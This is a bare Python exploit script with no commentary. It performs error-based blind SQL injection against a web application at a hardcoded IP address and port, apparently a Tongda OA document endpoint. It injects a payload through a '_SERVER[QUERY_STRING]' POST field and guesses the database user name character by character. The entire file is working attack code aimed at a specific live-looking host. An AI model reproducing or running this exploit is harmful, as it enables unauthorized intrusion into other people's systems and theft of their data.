

import requests


ip = '113.107.227.146'
port = '8002'
data = 'qwertyuiopasdfghjklzxcvbnmQWERTIOPASDFGHJKLZXCVBNM'
data = list(data)

for dddd in data:
    post = {'_SERVER[QUERY_STRING]': "kname%3D1' and @`'` or if(substr(user(),1,1)='" + dddd + "',1,exp(720))%23"}

    r = requests.post('http://' + ip + ":" + port + '/general/document/index.php/setting/keywords/index', data=post)
    if r.status_code == 200:
        print(dddd)
        print('http://' + ip + ":" + port + '/general/document/index.php/setting/keywords/index')



